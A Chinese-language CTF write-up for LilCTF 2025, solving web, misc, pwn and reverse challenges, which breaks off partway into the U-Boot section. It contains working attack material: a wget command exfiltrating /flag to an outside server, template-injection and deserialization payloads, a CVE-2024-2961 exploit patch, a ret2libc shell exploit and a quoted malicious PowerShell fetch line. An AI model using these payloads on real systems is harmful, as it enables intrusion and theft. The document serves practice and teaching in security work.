# LilCTF-2025 Writeup by Phrinky

Blog 链接: https://blog.rkk.moe/2025/08/18/LilCTF-2025-Writeup/

## Web

### Ekko_note

看到 RCE 部分代码:

![](images/ekko_note-12.webp)

其中调用的 `check_time_api` 函数:

![](images/ekko_note-13.webp)

定义的默认 `time_api`:

![](images/ekko_note-14.webp)

可猜测此处需要修改 `time_api` 来通过 2066 年的检测。

而修改 `time_api` 需要 `admin` 权限:

![](images/ekko_note-15.webp)

审阅代码可发现重置密码的生成 Reset Token 逻辑部分使用了 UUID-8，并且自定义了参数，猜测这部分可能存在漏洞:

![](images/ekko_note-1.webp)

翻阅 Python 文档可知道 `uuid.uuid8()` 函数在 Python 3.14 引入，在调试的时候需要使用 Python 3.14:

![](images/ekko_note-2.webp)

再对 Python 源码的实现进行审阅:

![](images/ekko_note-3.webp)

不难发现 UUID-8 的生成依赖 `random` 库，且使用的全局 Random 状态。

再看到题目代码:

![](images/ekko_note-4.webp)

通过 `/server_info` 路由可获取到 `SERVER_START_TIME`:

![](images/ekko_note-5.webp)

且 `admin` 具有 `is_admin` 权限:

![](images/ekko_note-7.webp)

确定可利用此处漏洞对 admin 用户密码进行重置。

对于 `SERVER_START_TIME` 的获取需要登录（但不需要管理员权限），所以先需要注册个普通用户进行获取:

![](images/ekko_note-6.webp)

获取得 `SERVER_START_TIME` 后可对 admin 用户进行重置:

![](images/ekko_note-8.webp)

使用 Python 3.14 并复制相应生成逻辑可得到 Reset Token:

![](images/ekko_note-9.webp)

使用该 Token 即可重置 admin 密码:

![](images/ekko_note-10.webp)

![](images/ekko_note-11.webp)

可进入 **管理员设置** 界面修改时间 API:

![](images/ekko_note-16.webp)

此时可以使用自己的服务器或其他公共服务提供以下 JSON:

```json
{"date": "2067-01-01T00:00:00"}
```

![](images/ekko_note-17.webp)

![](images/ekko_note-18.webp)

打开 **执行命令** 界面可确认修改成功:

![](images/ekko_note-19.webp)

此时执行 `wget http://<SERVER_ADDR>/$(cat /flag)` 即可获得 Flag:

![](images/ekko_note-20.webp)

最后得到 Flag 为: `LILCTF{u_haV3_10uND_thE_r1Ght_TIMe1lN3!}`

### ez_bottle

审阅代码可得知 `/view/<md5>/<filename>` 路由存在模板注入风险:

![](images/ez_bottle-1.webp)

且存在以下关键词黑名单:

![](images/ez_bottle-2.webp)

看到上传函数，虽然接受的是压缩包，但是非法路径和符号链接都被受到了限制:

![](images/ez_bottle-3.webp)

可确认只能使用模板注入。

查看 Bottle 文档 *[Embedded Python Code](https://bottlepy.org/docs/dev/stpl.html#embedded-python-code)* 部分:

![](images/ez_bottle-4.webp)

可确认 `%` 符号不受黑名单限制，可构造不包含黑名单关键字的单行 Python 代码即可:

```python
% assert False, locals()["\137\137builtins\137\137"]["ope""n"]("/flag").read()
```

将以上代码打包至 Zip 档案包上传即可:

![](images/ez_bottle-5.webp)

访问相应路径即可获得 Flag:

![](images/ez_bottle-6.webp)

得到 Flag 为: `LILCTF{6o7Tl3_hAS_8een_r3cyCLeD}`

### Your Uns3r

看到代码:

![](images/your_unser-1.webp)

不难发现：传入的 user 参数会经过反序列化，且检测是否同时包含 `admin` 和 `Access":`，`User` 实例在 Destruct 的时候会检测 `username` 是否为 `admin`（弱比较，可以传入 `0` 绕过检查），如果条件为真则反序列化且要求反序列化结果为 `Access` 实例并调用其 `getToken()` 成员函数并对其进行 `include`。

可大致猜测此处利用 LFI (Local File Include) 漏洞获得 Flag，构造 `Access->prefix` 为 `/`，`Access->suffix` 为 `/../flag`，最后拼接出字符串 `/lilctf/../flag`，PHP 会自动解析路径为 `/flag`。

但是注意到最后有个异常抛出，可以通过试验发现 PHP5 (PHP7 以上会调用) 在抛出异常后不会调用 `__destruct` 销毁对象:

![](images/your_unser-2.webp)

经检测题目环境为 PHP5:

![](images/your_unser-3.webp)

所以此处需要构造一个需要被 GC 立即回收的对象，下面将会构造一个 Array，利用反序列化特性，将 User 对象写入到 Array 的第一个索引，再将 null 值再次写入到 Array 的第一个索引，这样即可立即触发 GC 回收。

根据上面的发现可以编写 PHP 脚本获得序列化字符串:

```php
<?php
class User
{
    public $username;
    public $value;
}

class Access
{
    protected $prefix;
    protected $suffix;
    
    public function __construct($prefix, $suffix)
    {
    	$this->prefix = $prefix;
    	$this->suffix = $suffix;
    }
}

$access = new Access("/", "/../flag");

$user = new User();
$user->username = 0;
$user->value = serialize($access);

$ser = serialize(array($user, NULL));
$ser = str_replace('i:1;N;}', 'i:0;N;}', $ser); // 将最后的 null 索引修改成 0
echo urlencode($ser);
```

获得序列化结果后使用 `curl` 发送即可获得 Flag:

![](images/your_unser-4.webp)

得到 Flag 为: `LILCTF{GOnN4_1lnd_YOUr_4NSwER_To_uN$eR}`

### 我曾有一份工作

根据题目提示:

![](images/one_job-1.webp)

下面将使用 `dirsearch` 进行扫描，通过备份一词猜测会有个 Tar 或者 Zip 之类的档案包。

由于 Discuz 会在不存在的界面返回 index.php 的内容，为了减少搜索成功结果，将会在 `dirsearch` 时过滤掉字符串 `<title>论坛 -  Powered by Discuz!</title>`。

结合上述想法可使用以下指令进行搜索:

```shell
dirsearch -u http://[ENDPOINT] --exclude-text="<title>论坛 -  Powered by Discuz!</title>" -e php,html,htm,zip,tar,gz -a
```

可扫描到有 `www.zip` 档案包:

![](images/one_job-4.webp)

打开后可以看到是 Discuz X! 的源码，可以直接看到 config 目录下，猜测存在有敏感数据泄漏:

![](images/one_job-2.webp)

通过日期和名称可以看出来下面的是源码所分发的默认配置，而上面的是服务器所使用的配置:

![](images/one_job-3.webp)

打开上面两个文件配置，可以看到两个比较显眼的 Key `authkey` 和 `UC_KEY`:

![](images/one_job-5.webp)

![](images/one_job-6.webp)

通过搜索引擎可以搜索到 `authkey` 的利用方法:

![](images/one_job-7.webp)

搜索出来的基本都是针对于邮箱验证的接口进行利用，但是看到网上给出相应片段的代码:

![](images/one_job-8.webp)

再看到源码包给出来的相应片段（位于文件 `source/include/misc/misc_emailcheck.php`）:

![](images/one_job-9.webp)

不难发现新版本的 Discuz X! 增加了额外的在数据库存储相应的验证字符串，并进行了验证，确认了此方法不再可行。

但是通过 [文章](https://cloud.tencent.com/developer/article/2220724) 可以知道，重置密码用的 code 是通过 authcode 函数生成的，所以可以猜测哪些地方也利用到了 authcode 函数，可以使用 `find` 结合 `grep` 对源码进行搜索，执行以下指令:

```shell
find . -type f -name "*.php" -exec grep -H "authcode" {} \;
```

不难发现迎面而来一个非常可疑的 API `dbbak.php`，可通过名字猜测为数据库备份用的:

![](images/one_job-10.webp)

看到相关调用部分，这边使用了 `UC_KEY` 进行编解码，可大致确认可以利用，并且此处进行时间校验，限制了 code 有效时间为 1hr:

![](images/one_job-11.webp)

在往下看可以看到 `method` 可指定为 `export` 进行导出（由于代码篇幅过长不适合放出来）:

![](images/one_job-12.webp)

看到请求参数的定义，可确认需要将 code 传入到 `code` 参数，再传入一个 `apptype`:

![](images/one_job-13.webp)

看到下面对 `apptype` 的检查，大致可猜测出来这个 API 是个几个应用的通用的 API，而这边使用的是 Discuz X!，所以 `apptype` 应当是 `discuzx`。

![](images/one_job-14.webp)

结合上面在 `config` 文件夹找到的 UC_KEY，利用 API 里面定义的 `_authcode` 函数，根据上面的分析，可以写出脚本:

```php
<?php

function _authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
	$ckey_length = 4;

	$key = md5($key ? $key : UC_KEY);
	$keya = md5(substr($key, 0, 16));
	$keyb = md5(substr($key, 16, 16));
	$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

	$cryptkey = $keya.md5($keya.$keyc);
	$key_length = strlen($cryptkey);

	$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
	$string_length = strlen($string);

	$result = '';
	$box = range(0, 255);

	$rndkey = array();

	for($i = 0; $i <= 255; $i++) {
		$rndkey[$i] = ord($cryptkey[$i % $key_length]);
	}

	for($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}

	for($a = $j = $i = 0; $i < $string_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
	}

	if($operation == 'DECODE') {
		if(((int)substr($result, 0, 10) == 0 || (int)substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) === substr(md5(substr($result, 26).$keyb), 0, 16)) {
			return substr($result, 26);
		} else {
				return '';
			}
	} else {
		return $keyc.str_replace('=', '', base64_encode($result));
	}

}

$UC_KEY = 'N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb';
$params = "time=".time()."&method=export";
$code = _authcode($params, 'ENCODE', $UC_KEY);

echo $code."\n";
parse_str(_authcode($code, 'DECODE', $UC_KEY), $get);
echo var_dump($get);
```

![](images/one_job-15.webp)

拿到请求器发送请求可以看到成功导出了 SQL 文件，并且 `<nexturl>` 标签附上了下一段 SQL 的请求 URL:

![](images/one_job-16.webp)

请求完之后应该有 3 段 SQL 文件，可在第 1 段 SQL 文件找到 `pre_a_flag` 定义:

![](images/one_job-17.webp)

在里面通过搜索不难看到往 `pre_a_flag` 表里插入了两个值:

![](images/one_job-18.webp)

Hex 解码分解可以得到两个 Flag:

![](images/one_job-19.webp)

按照格式要求可得到 Flag 为: `LILCTF{h4VE_Y0u_FouND_A_J#b_n#w?_haH@HA}`

### php_jail_is_my_cry

看到题目描述的说明:

![](images/php_jail-1.webp)

再看到源代码:

![](images/php_jail-2.webp)

不难发现这边是利用的 `curl` 对文件进行的获取。

但看到 `php.ini` 的 `open_basedir` 定义:

![](images/php_jail-3.webp)

再看到 [PHP 文档](https://www.php.net/manual/en/function.curl-init.php) 对 `curl_init` 的说明:

![](images/php_jail-4.webp)

会发现 `curl` 实际上不能使用 `file` Protocol 的，而这里使用了，说明了这里是利用了某个漏洞。

通过搜索引擎搜索可以发现 `curl` 是有个 Bypass 的 Issue 报告:

![](images/php_jail-5.webp)

看到 Issuer 使用的 PHP 版本是 `8.3.13`，利用了下面选中部分的代码进行 Bypass:

![](images/php_jail-6.webp)

而附件给出的 PHP 版本为 `8.3.0`，小于 Issuer 使用的 PHP 版本:

![](images/php_jail-7.webp)

基本可以确定是使用了该代码进行绕过的:

```php
curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
```

补充代码到相应注释处即可开始本地调试。

看到源代码:

![](images/php_jail-8.webp)

由于题目中提到了不出网，而在接受 `url` 参数的时候并没有使用上面所发现的漏洞进行绕过，所以基本确定 `url` 参数是不可用的。

而接受 `down` 参数的处理逻辑内有 LFI 漏洞，但是取了 `basename`，限定了 `/tmp` 目录，只能对上传的文件进行 include。

看到接受 `file` 参数时的逻辑，可以看到其对 `<?`、`php`、`halt` 字符串进行了检测且无法绕过。

再看到 php.ini 对 `short_open_tag` 的定义为 `Off`，也确定了 `<?`、`<%` 一类短标签不可用:

![](images/php_jail-9.webp)

可确定这里需要利用 `phar` 档案包并压缩处理进行 ACE。

编写代码以便生成 `phar` 档案包:

```php
<?php
$p = new Phar("exp.phar");
$p->compressFiles(Phar::GZ);
$p->startBuffering();
$p['syaro.txt'] = 'suki!';
$p->setStub(
'// code here.
__HALT_COMPILER();'
);
$p->stopBuffering();

$fp = gzopen("exp.phar.gz", 'w9');
gzwrite($fp, file_get_contents("exp.phar"));
gzclose($fp);
```

看到 `php.ini` 定义的这个 ~~比我命还要长的~~ `disable_functions`，基本也能确定不能通过常规的 PHP 函数执行 RCE:

![](images/php_jail-10.webp)

所以接下来猜想需要利用 `php` Protocol 的 `iconv` 漏洞进行 RCE。

在搜索引擎搜索 `php iconv rce` 关键词可以看到就有一篇 [Blog 文章](https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html) 讲述了利用 `iconv` 漏洞进行 RCE 的文章:

![](images/php_jail-11.webp)

可以看到是 CVE-2024-2961，利用了 CN-EXT 编码的转换漏洞:

![](images/php_jail-13.webp)

再看到 CVE-2024-2961 的修复 commit 信息:

![](images/php_jail-12.webp)

看到容器的 glibc 版本为 `2.36-9`，为未修复版本:

![](images/php_jail-14.webp)

可确认该漏洞可利用。

通过文章可以找到 [脚本](https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py)。

看到脚本所需的前置代码:

![](images/php_jail-17.webp)

其中需要 `file_get_contents` 来对文件进行获取，但不幸的是 `file_get_contents` 被禁用了，但是这边只是需要读取文件数据和利用 `php://` Protocol 的 `iconv` 漏洞，所以前者使用 `curl` 后者使用 `include` 也能达到同样的效果。

然后看到 Hint:

![](images/php_jail-15.webp)

再看到脚本里面:

![](images/php_jail-16.webp)

由于 `data` Protocol 在 `include` 里面使用需要 `allow_url_include` 启用，会发现脚本是无法直接使用的，但这边可以将 `data` Protocol 修改成上传文件再从本地读取内容。

编写 PHP 脚本，并使用上面编写的 phar 打包脚本生成 phar 档案包:

```php
<?php
if (isset($_POST["include"])) {
    include $_POST["include"];
}

if (isset($_POST["download"])) {
    $ch = curl_init("file://". $_POST["download"]);
    curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    echo $data;
}

if (isset($_POST["content"]) && isset($_POST["path"])) {
    $content = $_POST["content"];
    if ($_POST["base64"]) {
    	$content = base64_decode($content);
    }
    file_put_contents($_POST["path"], $_POST["content"]);
}
```

随后修改脚本（由于脚本篇幅过长，修改处不多，这边只贴出 **Patch 文件**）:

```patch
--- old/cnext-exploit.py	2025-08-18 13:55:55.256163528 +0800
+++ new/cnext-exploit.py	2025-08-18 13:55:43.005206555 +0800
@@ -22,6 +22,9 @@
 from pwn import *
 from ten import *
 
+import random
+import string
+
 
 HEAP_SIZE = 2 * 1024 * 1024
 BUG = "劄".encode("utf-8")
@@ -52,15 +55,22 @@
     def send(self, path: str) -> Response:
         """Sends given `path` to the HTTP server. Returns the response.
         """
-        return self.session.post(self.url, data={"file": path})
+        return self.session.post(self.url, data={"include": path})
+        
+    def upload(self, path: str, content: str) -> Response:
+        return self.session.post(self.url, data={"path": path, "content": content})
+        
+    def iconv(self, filters: str | None, content: str | bytes) -> Response:
+        filename = "".join(random.choices(string.ascii_letters, k=6))
+        path = "/tmp/" + filename
+        self.upload(path, content)
+        return self.send(f"php://filter{filters}/resource={path}")
         
     def download(self, path: str) -> bytes:
         """Returns the contents of a remote file.
         """
-        path = f"php://filter/convert.base64-encode/resource={path}"
-        response = self.send(path)
-        data = response.re.search(b"File contents: (.*)", flags=re.S).group(1)
-        return base64.decode(data)
+        
+        return self.session.post(self.url, data={"download": path}).content
 
 @entry
 @arg("url", "Target URL")
@@ -93,6 +103,13 @@
         wrappers and filters that the exploit needs.
         """
         
+        def safe_iconv(filters: str, content: str) -> Response:
+            try:
+                return self.remote.iconv(filters, content)
+            except ConnectionError:
+                failure("Target not [b]reachable[/] ?")
+
+
         def safe_download(path: str) -> bytes:
             try:
                 return self.remote.download(path)
@@ -100,15 +117,14 @@
                 failure("Target not [b]reachable[/] ?")
             
 
-        def check_token(text: str, path: str) -> bool:
-            result = safe_download(path)
+        def check_token(filters: str, content: str) -> bool:
+            result = safe_iconv(filters, content).content
             return text.encode() == result
 
         text = tf.random.string(50).encode()
         base64 = b64(text, misalign=True).decode()
-        path = f"data:text/plain;base64,{base64}"
         
-        result = safe_download(path)
+        result = safe_iconv("", text).content
         
         if text not in result:
             msg_failure("Remote.download did not return the test string")
@@ -121,18 +137,15 @@
         msg_info("The [i]data://[/] wrapper works")
 
         text = tf.random.string(50)
-        base64 = b64(text.encode(), misalign=True).decode()
-        path = f"php://filter//resource=data:text/plain;base64,{base64}"
-        if not check_token(text, path):
+        if not check_token("/", text):
             failure("The [i]php://filter/[/] wrapper does not work")
 
         msg_info("The [i]php://filter/[/] wrapper works")
 
         text = tf.random.string(50)
-        base64 = b64(compress(text.encode()), misalign=True).decode()
-        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"
+        compressed = compress(text.encode())
 
-        if not check_token(text, path):
+        if not check_token("/zlib.inflate", compressed):
             failure("The [i]zlib[/] extension is not enabled")
 
         msg_info("The [i]zlib[/] extension is enabled")
@@ -443,8 +456,6 @@
         )
 
         resource = compress(compress(pages))
-        resource = b64(resource)
-        resource = f"data:text/plain;base64,{resource.decode()}"
 
         filters = [
             # Create buckets
@@ -474,15 +485,15 @@
         filters = "|".join(filters)
         path = f"php://filter/read={filters}/resource={resource}"
 
-        return path
+        return f"/read={filters}", resource
 
     @inform("Triggering...")
     def exploit(self) -> None:
-        path = self.build_exploit_path()
+        filters, content = self.build_exploit_path()
         start = time.time()
 
         try:
-            self.remote.send(path)
+            self.remote.iconv(filters, content)
         except (ConnectionError, ChunkedEncodingError):
             pass
         
```

上传 phar 档案包:

![](images/php_jail-18.webp)

随后复制链接执行脚本:

```shell
python3 cnext-exploit.py 'http://<ENDPOINT>/?down=exp.phar.gz' "/readflag > /tmp/flag"
```

![](images/php_jail-19.webp)

可以看到攻击成功。

随后访问 `http://<ENDPOINT>/?down=flag` 即可获得 Flag:

![](images/php_jail-20.webp)

得到 Flag 为: `LILCTF{BreaK_0U7_7HE_jA11_AND_heAR_My_cURI_CrY}`

## Misc

### 是谁没有阅读参赛须知？

在比赛规则内的第 3 点可找到 Flag:

![](images/oshirase-1.webp)

得到 Flag 为: `LILCTF{Me4n1ngFu1_w0rDs}`

### v我50(R)MB

阅读题意可得知文件信息改了，但是文件并没有更新:

![](images/vivo50-1.webp)

可猜测此处对应 HTTP Header 的 `Content-Length` 信息受到了修改，导致数据信息截断，而实际上服务器在发送至相应大小之后并没有停止发送，而是仍在发送文件。

通过 Developer Tools 找到图片路径 `/api/file/download/72ddc765-caf6-43e3-941e-eeddf924f8df`:

![](images/vivo50-2.webp)

可利用 `curl` 忽略 Content-Length 接收文件:

```shell
curl --output flag.png --ignore-content-length http://<ENDPOINT>/api/file/download/72ddc765-caf6-43e3-941e-eeddf924f8df
```

![](images/vivo50-3.webp)

可发现接收的大小符合题目预期的 1MB，也能看到图片能正常打开:

![](images/vivo50-flag.webp)

得到 Flag 为: `LILCTF{i_dONT_KNOW_8U7_A1_GENerATEd_7hAT_c0d3}`

### PNG Master

使用 `zsteg` 可以看到能分析出一个 Zlib 文件和两段 Base64:

![](images/png_master-1.webp)

对 Base64 解码可以获得两段 Flag:

![](images/png_master-2.webp)

- Flag1: `LILCTF{`
- Flag2: `Y0u_4r3_M`

然后执行指令 `zsteg -E "extradata:1" [FILE] > data.zlib` 解出 zlib 数据:

![](images/png_master-3.webp)

解压 zlib 数据后不难看出来是一个 Zip 档案包:

![](images/png_master-4.webp)

将它保存到文件里:

![](images/png_master-5.webp)

可以看到 `hint.txt` 有一段文本但实际大小有 `195 B`，可猜测有零宽字符:

![](images/png_master-6.webp)

复制出来拿到解码器可以看到:

![](images/png_master-7.webp)

得到提示 `与文件名xor`。

看到题目介绍:

![](images/png_master-8.webp)

可以猜测 `secret.bin` 里面的内容需要与 `secret` 异或解码，可使用 CyberChef 上传文件进行解密:

可以得到 Flag3 的 Hex 值:

![](images/png_master-9.webp)

可以得到 Flag3 为 `as7er_in_PNG}`:

![](images/png_master-10.webp)

拼接后可得到 Flag 为: `LILCTF{Y0u_4r3_Mas7er_in_PNG}`

### 提前放出附件

> ~~经典线下赛提前放出加密大附件压缩包，可能还有百度网盘元素加持，不妨碍大家想要拆拆包。~~

使用 John 字典爆破无果，选用 bkcrack 明文攻击。

不难看到 Zip 档案包内有个 `flag.tar` 文件:

![](images/public_ahead-2.webp)

猜测 `flag.tar` 内部存着 `flag.txt` 文件，可以写一个 `flag.txt` 文件打包成 `flag.tar` 查看文件头，利用文件头进行明文攻击。

执行以下指令生成文件头:

```shell
echo -n "LILCTF{" > flag.txt
tar -cf flag.tar flag.txt
head -c 16 flag.tar > header.bin
```

![](images/public_ahead-3.webp)

随后执行 `bkcrack -C [ZIP_PATH] -c flag.tar -p header.bin` 即可爆破出密钥 `945815e7 4e7a2163 e46b8f88`:

![](images/public_ahead-1.webp)

随后执行 `bkcrack -C [ZIP_PATH] -c flag.tar -k 945815e7 4e7a2163 e46b8f88 -d flag.tar` 即可解压出 `flag.tar`，解出 `flag.tar` 即可获得 Flag:

![](images/public_ahead-4.webp)

得到 Flag 为: `LILCTF{Z1pCRyp70_1s_n0t_5ecur3}`

## Pwn

### 签到

使用反编译器反编译可看到 `read` 函数调用处存在 Stack Arbitrary Write 风险:

![](images/pwn-signin-1.webp)

对 Stack 进行分析，可确定 `buf` 到 `retaddr` 之间的空间大小为 0x78。

且题目给出 `libc.so` 附件，可通过 ret2libc 调用 `system("/bin/sh")` 获得 Shell (此处借用了 [reHex Ninja 的代码](https://rehex.ninja/posts/ret2libc/) 进行修改):

```python
import pwn

p = pwn.remote("<REMOTE_HOST>", <REMOTE_PORT>)

pwn.context(os='linux', arch='amd64')

elf = pwn.ELF("./pwn")
libc = pwn.ELF("./libc.so.6")

pwn.info("Stage 1, leak puts addr")
p.recvuntil(b"What's your name?\n")

# prepare payload
fill = b'A' * 0x78
rop = pwn.ROP(elf)
rop.call(elf.plt["puts"], [elf.got["puts"]])
rop.call(elf.symbols["main"])
payload = b"".join([fill, rop.chain()])

p.sendline(payload)

# extract leaked puts address
raw_data = p.recvuntil(b'\n')
raw_data = raw_data.strip()  # \
raw_data = raw_data[-6:]     # - skip unnecesary data

leaked_puts = raw_data.ljust(8, b'\x00') # fill missing bytes with zeroes
leaked_puts = pwn.u64(leaked_puts)
pwn.success(f'Leaked puts: {leaked_puts:x}')


pwn.info("Stage 2, ret2shell")
# calculate offset, base address of the libc in the memory
libc.address = leaked_puts - libc.symbols['puts']

# prepare the final payload
rop = pwn.ROP(libc)
rop.call(rop.find_gadget(['ret']))
rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\x00"))])
payload = b"".join([fill, rop.chain()])

p.sendline(payload)
pwn.success("Have fun!")
p.interactive()
```

执行脚本输入 `cat /flag` 即可获得 Flag:

![](images/pwn-signin-2.webp)

可得到 Flag 为: `LILCTF{007bd515-bb73-485d-896a-5a3b7dcfeccf}`

## Reverse

### ARM ASM

使用 JADX 反编译可发现 Flag 的加密逻辑是定义在 Native Library 里面的 ~~（为什么加密函数是叫 `check` 函数，有点神秘（x）~~，且加密后的字符串为 `KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S`:

![](images/arm_asm-1.webp)

将 Resources 内 `lib/arm64-v8a/libez_asm_hahaha.so` 提取出来放到反编译器分析。

![](images/arm_asm-2.webp)

可大致分析出来 `check` 函数先使用了一个 Block Cipher 对传入的字符串进行了加密处理，且使用了一个名为 `t` 的初始向量:

![](images/arm_asm-3.webp)

上面反编译出来的 `vqtbl1q_s8` 函数可以看到 [ARM 文档](https://developer.arm.com/architectures/instruction-sets/intrinsics/vqtbl1q_s8) 描述:

![](images/arm_asm-11.webp)

可以知道这个函数是将 `t` 向量按照 `idx` 向量的索引重新排列。

随后进行了一次高低位互换的编码转换:

![](images/arm_asm-4.webp)

可通过以下变换得到原字符:

```python
b0 = ((b0 >> 3) | (b0 << 5)) & 0xFF
b1 = ((b1 << 1) | (b1 >> 7)) & 0xFF
b2 = b2
```

最后进行了 Base64 编码:

![](images/arm_asm-5.webp)

看到 `encodeBase64` 函数的定义:

![](images/arm_asm-6.webp)

可判断出来是标准的 Base64 变换，变换表存储在 `base64` 全局变量上:

![](images/arm_asm-7.webp)

可看到为非标准 Base64 表（部分位发生了调换）。

由于此处为非标准 Base64 变换，将使用 CyberChef 解码得到 Base64 解码后的数据:

![](images/arm_asm-9.webp)

找到初始向量 `t` 的值:

![](images/arm_asm-10.webp)

编写脚本:

```python
INIT_T = bytes.fromhex("0d0e0f0c0b0a09080607050402030100")

decoded = bytes.fromhex("92b77c0bbc6bb2397d13a150722048623461c3b054eb336dca35725bb766f2b66993bc62aa3367f3316b9b2d6c3baf6c")

rotated = bytearray()
for i in range(0, 48, 3):
    b0 = decoded[i]
    rotated.append(((b0 >> 3) | (b0 << 5)) & 0xff)
    b1 = decoded[i + 1]
    rotated.append(((b1 << 1) | (b1 >> 7)) & 0xff)
    b2 = decoded[i + 2]
    rotated.append(b2)

decrypted = bytearray(48)

t = INIT_T
for i in range(0, 3):
    shuffled = bytes(x ^ y for x, y in zip(rotated[i * 16 : (i + 1) * 16], t))
    for j in range(16):
        index = t[j] + (i * 16)
        decrypted[index] = shuffled[j]
    t = bytes(x ^ i for x in t)

print(decrypted)
```

执行脚本即可获得 Flag:

![](images/arm_asm-8.webp)

得到 Flag 为: `LILCTF{ez_arm_asm_meow_meow_meow_meow_meow_meow}`

### 1'M no7 A rO6oT

打开网站点开验证可发现以下内容:

![](images/captcha-1.webp)

可猜测为 PowerShell 代码执行风险代码 ~~(我手上没有 Windows 环境也测不了)~~，粘贴可看到以下代码:

```shell
powershell . \*i*\\\\\\\\\\\\\\\*2\msh*e http://<HOST>/Coloringoutomic_Host.mp3   http://<HOST>/Coloringoutomic_Host.mp3 #     ✅ Ι am nοt a rοbοt: CAPTCHA Verification ID: 10086
```

可猜测 `http://<HOST>/Coloringoutomic_Host.mp3` 路径存在恶意代码。

使用 `ffprobe` 可发现在 `28765 byte` 处存在 `27080 bytes` 的无用数据:

![](images/captcha-2.webp)

使用 `dd` 可提取出相应代码:

![](images/captcha-3.webp)

经过简单判断，混淆代码会在调用 `eval` 后执行，且反混淆后的代码将会存储在 `SxhM` 变量上。

复制解码部分代码到 `Node.js` 上执行，可得到另一份混淆代码:

![](images/captcha-4.webp)

可通过代码内容猜测出以上字符序列均为原字符的 Char Code 值 +601 得到，可利用以下 Python 脚本得到原始内容:

```python
CHARS = ...
print(bytes(c - 601 for c in CHARS))
```

可得到又一份代码:

![](images/captcha-5.webp)

经过简单判断可知道上面 Hex 值是代码对 204 XOR 的结果，可使用以下 Python 脚本获得源代码。

```python
HEX = ...
print(bytes(b ^ 204 for b in bytes.fromhex(HEX)))
```

![](images/captcha-6.webp)

不难发现此处又有一份恶意代码存储在 `http://<HOST>/bestudding.jpg` 上。

使用 curl 可发现为一段混淆过的 PowerShell 代码:

![](images/captcha-7.webp)

可发现文件最后有 `|  .$r`，可猜测为 `iex` 对前面内容执行:

![](images/captcha-8.webp)

除去末尾的 `|  .$r` 执行代码可得到:

![](images/captcha-9.webp)

删除掉 `iex` 调用执行可得到:

![](images/captcha-10.webp)

~~(怎么还有个 Ciallo，柚子➗蒸鹅心 (bushi))~~

不难找到 Flag 存储在 `fF1IA49G` 变量上，得到 Flag 为: `LILCTF{83_vigiIAnT_ag@lnS7_pHlsHiN9}`

### Oh_My_Uboot

下载 ELF 后使用反编译器打开:

![](images/uboot-10.webp)

可确定 ELF 基址为 `0x60800000`，对 U-Boot 的配置进行查询:

![](images/uboot-11.webp)

可确定上述机器加载基址均为 `0x60800000`，此处将使用 `vexpress-a9` 配置进行模拟。

执行以下指令编译 U-Boot 以便后续调试操作 (需自行解决依赖问题):

```shell
make vexpress_ca9x4_defconfig
make CROSS_COMPILE=arm-none-eabi- -j$(nproc)
```

使用 `qemu-system-arm -M vexpress-a9 -kernel re-u-boot -nographic -gdb tcp::3333` 指令启动 U-Boot 并开放 GDB 服务器到端口 `:3333` 以便调试:

![](images/uboot-1.webp)

看到最后显示要输入密码，可猜测密码为 Flag:

![](images/uboot-2.webp)

尝试搜索 `password` 字符串无法找到，可猜测经过了字符串加密:

![](images/uboot-3.webp)

但是在 **Strings** 窗口可以看到其他字符串并没有经过加密:

![](images/uboot-4.webp)

可以通过字符串的交叉引用找到将字符串输出到 Console 的函数:

![](images/uboot-5.webp)

![](images/uboot-6.webp)

可确定 `sub_6081886c` 对应为输出 Console 函数，并命名为 `write_console`。

同理下面的函数 `sub_60865954` 为格式化输出函数，可命名为 `printf`:

![](images/uboot-7.webp)

![](images/uboot-8.webp)

看到 [U-Boot 文档](https://docs.u-boot.org/en/latest/develop/gdb.html#running-a-gdb-session):

![](images/uboot-9.webp)

可以看到 ELF 加载后 Relocation 的地址可以通过 `r9` 寄存器上指向的全局数据获得。

此处将使用 `pwndbg` 进行调试。

使用 `target remote :3333` 连接到 QEMU:

![](images/uboot-12.webp)

执行 `add-symbol-file u-boot` 以添加 symbol，后执行 `p/x (*(struct global_data*)$r9)->relocaddr` 指令即可获取 Relocation 后的基址:

![](images/uboot-13.webp)

可得到基址为 `0x67f5e000`，将反编译器 Rebase 到相应基址以便于后续调试:

![](images/uboot-15.webp)

通过测试可发现：在输入错误密码之后 U-Boot 会输出字符串 `### Please input uboot password: ###`:

![](images/uboot-14.webp)

可根据以上发现对 `write_console` 和 `printf` 函数进行断点测试。

![](images/uboot-16.webp)

![](images/uboot-17.webp)

可以看到 Rebase 后这两个函数的地址分别是 `0x67f7686c` 和 `0x67fc3954`，在 Debugger 里输入 `b *0x67f7686c` 和 `b *0x67fc3954` 对这两个函数进行断点:

![](images/uboot-18.webp)

然后输入 `c` 让程序继续运行至断点，在 QEMU 窗口按下回车可以发现断点触发:

![](images/uboot-19.webp)

随后输入 `fin` 让程序运行到函数结束:

![](images/uboot-20.webp)

可以看到现在程序执行到了 `0x67f71fdc` 上，看到反编译器可以找到这个函数:

![](images/uboot-21.webp)

